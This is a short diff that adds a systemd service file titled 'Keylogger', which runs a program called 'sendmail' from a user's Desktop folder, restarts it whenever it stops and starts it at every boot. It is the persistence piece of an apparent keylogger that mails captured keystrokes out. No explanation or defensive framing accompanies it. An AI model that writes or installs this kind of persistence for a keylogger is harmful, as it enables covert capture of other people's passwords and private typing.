@@ -1,0 +1,11 @@
+[Unit]
+Description=Keylogger
+
+[Service]
+ExecStart=/home/<yourusername>/Desktop/sendmail
+Type=simple
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
